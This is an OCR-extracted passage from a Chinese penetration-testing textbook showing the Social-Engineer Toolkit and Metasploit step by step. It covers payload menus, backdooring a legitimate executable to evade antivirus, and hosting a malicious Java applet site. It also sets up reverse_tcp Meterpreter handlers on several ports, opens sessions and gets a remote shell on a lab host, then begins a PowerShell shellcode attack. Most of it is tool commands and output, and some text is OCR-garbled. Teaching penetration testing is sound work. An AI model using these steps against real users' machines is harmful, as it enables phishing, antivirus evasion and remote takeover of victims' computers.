[▪] Malicious java applet website prepped for deployment
What payload do you want to generate:
---
## Page 241
第7章权限提升
Name:
Description:
1) Windows Shell Reverse_TCP
Spawn a command shell on victim
and send back to attacker
2) Windows Reverse_TCP Meterpreter
Spawn a meterpreter shell on
victim and send back to attacker
3) Windows Reverse_TCP VNC DLL
Spawn a VNC server on victim and
send back to attacker
4) Windows Bind Shell
Execute payload and create an
accepting port on remote system
5) Windows Bind Shell X64
Windows x64 Command Shell, Bind
TCP Inline
6)Windows Shell Reverse_TCPX64
Windows X64 Command Shell,
Reverse TCP Inline
7)Windows Meterpreter Reverse_TCP X64
Connect back to the attacker
(Windows x64), Meterpreter
8) Windows Meterpreter All Ports
Spawn a meterpreter shell and
find a port home (every port)
9) Windows Meterpreter Reverse HTTPS
Tunnel communication over HTTP
using SSL and use Meterpreter
10) Windows Meterpreter Reverse DNS
Use a hostname instead of an IP
address and spawn Meterpreter
11) SE Toolkit Interactive Shell
Custom interactive reverse
toolkit designed for SET
12) SE Toolkit HTTP Reverse Shell
Purely native HTTP shell with
AES encryption support
13) RATTE HTTP Tunneling Payload
Security bypass payload that
will tunnel all comms over HTTP
14) ShellCodeExec Alphanum Shellcode
This will drop a meterpreter
payload through shellcodeexec
15) Pylnjector Shellcode Injection
This will drop a meterpreter
payload through Pylnjector
16) MultiPylnjector Shellcode Injection This will drop multiple
Metasploit payloads via memory
17) Import your own executable
Specify a path for your own
executable
set:payloads>
以上输出的信息显示了可使用的攻击载荷。
（6）这里选择WindowsReverse_TCPMeterpreter攻击载荷，建立一个反向TCP连接。
输入编号2，将显示如下所示的信息：
set:payloads>2
Select one of the below, *backdoored executable' is typically the best. However,
Budouyoed jeuoppe op o pau e no A Aq dn pxd joe s so
in order to get around basic AV detection.
1) shikata_ga_nai
2) No Encoding
3) Multi-Encoder
4)Backdoored Executable
set:encoding>4
#选择额外的包装方式
set:payloads> PORT of the listener [443]:
#设置监听的端口号
[*] Generating x86-based powershell injection code for port: 22
[*] Generating x86-based powershell injection code for port: 53
[*] Generating x86-based powershell injection code for port: 443
[▪] Generating x86-based powershell injection code for port: 21
[] Generating x86-based powershell injection code for port: 25
[+] Finished generating powershell injection bypass.
[] Encoded to bypass execution restriction policy..
· 229 ·
---
## Page 242
第3篇各种渗透测试
[-] Backdooring a legit executable to bypass Anti-Virus. Wait a few seconds.
[*] Backdoor completed successfully. Payload is now hidden within a legit executable.
[*] Apache appears to be running, moving files into Apache's home
************************************************
Web Server Launched. Welcome to the SET Web Attack.
***4**4**.**.**0**4****9*****4**9**.*********4***.
[--] Tested on Windows, Linux, and OSX [-]
[-] Apache web server is currently in use for performance. [--]
[] Moving payload into cloned website.
[*] The site has been moved. SET Web Server is now listening.
[-] Launching MSF Listener...
[-] This may take a few to load MSF...
口
/-
IVAI/
二
in Metasploit Pro -- learn more on http://rapid7.com/metasploit
=[ metasploit v4.9.3-2014070201 [core:4.9 api:1.0] ]
-- --=[ 1315 exploits - 716 auxiliary - 209 post
+ -- --=[341 payloads - 35 encoders - 8 nops
1
+ -- --=[ Free Metasploit Pro trial: http:/r-7.co/trymsp ]
[*] Processing /root.set/meta_config for ERB directives.
resource (/root/.set/meta_config)> use exploit/multi/handler
resource (/root/.set/meta_config)> set PAYLOAD windows/meterpreter/
reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
resource (/root/.set/meta_config)> set LHOST 192.168.6.103
LHOST => 192.168.6.103
resource (/root/.set/meta_config)> set EnableStageEncoding false
EnableStageEncoding => false
resource (/root/.set/meta_config)> set ExitOnSession false
ExitOnSession =>false
resource (/root/.set/meta_config)> set LPORT 22
LPORT => 22
resource (/root/.set/meta_config)> exploit -j
[+] Exploit running as background job.
resource (/root/.set/meta_config)> use exploit/multi/handler
resource (/root/.set/meta_config)> set PAYLOAD windows/meterpreter/
reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
resource (/root.set/meta_config)> set LHOST 192.168.6.103
LHOST => 192.168.6.103
resource (/root/.set/meta_config)> set EnableStageEncoding false
EnableStageEncoding => false
resource (/root.set/meta_config)> set ExitOnSession false
ExitOnSession => false
resource (/root.set/meta_config)> set LPORT 53
LPORT => 53
resource (/root/.set/meta_config)> exploit -j
[] Exploit running as background job.
resource (/root/.set/meta_config)> use exploit/multi/handler
resource (/root/.set/meta_config)> set PAYLOAD windows/meterpreter/
reverse_tcp
[*] Started reverse handler on 192.168.6.103:22
· 230 ·
---
## Page 243
第7章权限提升
[*] Starting the payload handler...
PAYLOAD => windows/meterpreter/reverse_tcp
resource (/root/.set/meta_config)> set LHOST 192.168.6.103
LHOST => 192.168.6.103
resource (/root.set/meta_config)> set EnableStageEncoding false
EnableStageEncoding => false
resource (/root/.set/meta_config)> set ExitOnSession false
ExitOnSession => false
resource (/root/.set/meta_config)> set LPORT 443
LPORT => 443
resource (/root/.set/meta_config)> exploit -j
[*] Exploit running as background job.
resource (/root/.set/meta_config)> use exploit/multi/handler
resource (/root/.set/meta_config)> set PAYLOAD windows/meterpreter/
reverse_tcp
[*] Started reverse handler on 192.168.6.103:53
PAYLOAD => windows/meterpreter/reverse_tcp
[*] Starting the payload handler...
[*] Started reverse handler on 192.168.6.103:443
resource (/root/.set/meta_config)> set LHOST 192.168.6.103
[+] Starting the payload handler...
LHOST => 192.168.6.103
resource (/root/.set/meta_config)> set EnableStageEncoding false
EnableStageEncoding => false
resource (/root/.set/meta_config)> set ExitOnSession false
ExitOnSession => false
resource (/root.set/meta_config)> set LPORT 21
LPORT => 21
resource (/root/.set/meta_config)> exploit -j
七
[*] Exploit running as background job.
resource (/root/.set/meta_config)> use exploit/multi/handler
resource (/root/.set/meta_config)> set PAYLOAD windows/meterpreter/
PAYLOAD => windows/meterpreter/reverse_tcp
reverse_tcp
resource (/root/.set/meta_config)> set LHOST 192.168.6.103
LHOST => 192.168.6.103
resource (/root/.set/meta_config)> set EnableStageEncoding false
EnableStageEncoding => false
resource (/root/.set/meta_config)> set ExitOnSession false
ExitOnSession =>false
resource (/root/.set/meta_config)> set LPORT 25
LPORT => 25
resource (/root/.set/meta_config)> exploit -j
[*] Exploit running as background job.
[*] Started reverse handler on 192.168.6.103:21
[*] Starting the payload handler...
msf exploit(handler) >
[] Started reverse handler on 192.168.6.103:25
[*] Starting the payload handler...
以上输出的信息是攻击主机的相关配置。这时候，当目标主机通过浏览器访问攻击主
机时将会被攻击。
（7）此时在目标主机上访问攻击主机，将出现如图7.20所示的界面。
（8）从该界面可以看到有一个警告对话框，询问是否要运行该程序。该对话框就是Java
applet弹出的。从名称中可以看到，是VerifiedTrustedand secure（VERIFIED）。现在单
·231 *
---
## Page 244
第3篇各种渗透测试
击“运行”按钮，攻击主机将会创建多个远程会话，如下所示：
p/192.168.6.108/
x@ n
腾讯网
营西·安宝
该应用程序的数字签名无法验证，是否要运行该应用
栏序Y
名称：
Frifitt Irat
发行者：
M:
二能性值任此发行者的内指 α0)
运行电话
X98(0
图7.20警告对话框
[*] Sending stage (769536 bytes) to 192.168.6.106
12:23:24 +0800
[] Meterpreter session 2 opened (192.168.6.103:21 -> 192.168.6.106:50728) at 2014-07-19
12:23:25 +0800
[*] Meterpreter session 3 opened (192.168.6.103:22 -> 192.168.6.106:50727) at 2014-07-19
12:23:25 +0800
[*] Meterpreter session 4 opened (192.168.6.103:53 -> 192.168.6.106:50730) at 2014-07-19
12:23:25 +0800
msf exploit(handler) >
从以上输出的信息中，可以看到创建了4个会话。此时可以使用sessions命令查看创
建的会话。
（9）查看会话。执行命令如下所示：
msf exploit(handler) > sessions
Active sessions
PI
Type
Information
Connection
**
1
meterpreter x86/win32
WIN-RKPKQFBLG6CVAdministrator @WIN-RKPKQFBLG6C
192.168.6.103:443 -> 192.168.6.106:50729 (192.168.6.106)
2
meterpreter x86/win32
WIN-RKPKQFBLG6C\Administrator@ WIN-RKPKQFBLG6C
192.168.6.103:21 -> 192.168.6.106:50728 (192.168.6.106)
3
meterpreter x86/win32
WIN-RKPKQFBLG6C\Administrator@WIN-RKPKQFBLG6C
192.168.6.103:22 -> 192.168.6.106:50727 (192.168.6.106)
4
meterpreter x86/win32
WIN-RKPKQFBLG6CIAdministrator@WIN-RKPKQFBLG6C
192.168.6.103:53 -> 192.168.6.106:50730 (192.168.6.106)
从输出的信息中，可以看到攻击主机使用不同的端口创建了四个会话。此时可以选择
启动任何一个会话，获取到远程主机的命令行Shell。
（10）启动会话1，并获取远程主机的Shell。执行命令如下所示：
msf exploit(handler) > sessions -i 1
[*] Starting interaction with 1..
· 232 ·
---
## Page 245
第7章权限提升
meterpreter > shell
Process 5056 created.
Channel 1 created.
Microsoft Windows [口汾 6.1.7601]
□□（c)20og Microsoft Corporation□□□□□□□□
C:\Users\Administrator\Desktop>
从输出的信息中，可以看到成功的获取到一个远程Shell。
7.4.3PowerShell攻击向量
在社会工程学中，使用基于Java的PowerShell攻击向量是非常重要的。如果目标主机
没有运行Java，则不能欺骗它访问攻击主机社会工程学的页面，将不能进行攻击。所以需
要使用另一种方法实现，就是向目标主机发送病毒文件。使用PowerShell攻击向量可以创
建PowerShell文件，并将创建好的文件发送给目标。当目标运行时，就可以获取一个远程
连接。本小节将介绍PowerShell攻击向量。
【实例7-3】使用PowerShell攻击向量创建PowerShell文件，并将该文件发送给目标
主机。具体操作步骤如下所示。
（1）启动社会工程学。执行命令如下所示：
Select from the menu:
1) Social-Engineering Attacks
2)Fast-Track Penetration Testing
3) Third Party Modules
4) Update the Metasploit Framework
5) Update the Social-Engineer Toolkit
6) Update SET configuration
7) Help, Credits, and About
99) Exit the Social-Engineer Toolkit
set>
（2）选择社会工程学，输入编号1，如下所示：
set> 1
Select from the menu:
1) Spear-Phishing Attack Vectors
2)Website Attack Vectors
3) Infectious Media Generator
4) Create a Payload and Listener
5) Mass Mailer Attack
6) Arduino-Based Attack Vector
7)SMS Spoofing AttackVector
8)Wireless Access Point AttackVector
9)QRCode GeneratorAttackVector
10)Powershell AttackVectors
11) Third Party Modules
99) Retun back to the main menu.
set>
（3）选择PowerShell攻击向量，输入编号10。将显示如下所示的信息：
set> 10
The Powershell Attack Vector module allows you to create PowerShell specific attacks. These
attacks will allow you to use PowerShell which is available by default in all operating systems
· 233 ·
---
## Page 246
第3篇各种渗透测试
performing functions that do not get triggered by preventative technologies.
1) Powershell Alphanumeric Shellcode Injector
2) Powershell Reverse Shell
3)Powershell Bind Shell
4) Powershell Dump SAM Database
99) Return to Main Menu
set:powershell>
（4）选择PowerShell字母代码注入，输入编号1。将显示如下所示的信息：
set:powershell>1
set> IP address for the payload listener: 192.168.6.103
#设置攻击主机的地址
set:powershell> Enter the port for the reverse [443]:
#设置反连接的端口号，这里使用默认端口号
[] Prepping the payload for delivery and injecting alphanumeric shellcode...
[*] Generating x86-based powershell injection code...
[*] Finished generating powershell injection bypass.
[] Encoded to bypass execution restriction policy..
[]Ifyouwantthepowershellcommandsandattack,theyareexportedto
/root/.set/reports/powershell/
set> Do you want to start the listener now [yes/no]: : yes
#是否现在监听
Unable to handle kernel NULL pointer dereference at virtual address Oxd34db33f
EFLAGS: 00010046
eax:00000001ebx:f77c8c00 ecx:00000000 edx:f77f0001
esi: 803bf014 edi: 8023c755 ebp: 80237f84 esp: 80237f60
ds: 0018es:0018 ss:0018
Process Swapper (Pid: 0, process nr: 0, stackpage=80377000)
Stack: 90909090990909090990909090
90909090990909090990909090
90909090.90909090.90909090
90909090.90909090.90909090
90909090.90909090.09090900
90909090.90909090.09090900
CCCCCCCCCCCCCCCCCCCCCCCCCC
CCCCCCCCCCCCCCCCCCCCCCCCCC
CCCCCCCCC.....
CCCCCCCCC
ffff..
ffff...
fff...
fffff..
Code: 00 00 00 00 M3 T4 SP L0 1T FR 4M 3W OR K! V3 R5 10 N4 00 00 00 00
Aiee, Killing Interrupt handler
Kernel panic: Attempted to kill the idle task!
In swapper task - not syncing
Payload caught by AV? Fly under the radar with Dynamic Payloads in
Metasploit Pro -- learn more on http://rapid7.com/metasploit
=[ metasploit v4.9.3-2014070201 [core:4.9 api:1.0]]
+ ----=[1315 exploits -716 auxiliary-209post
· 234 ·
---
## Page 247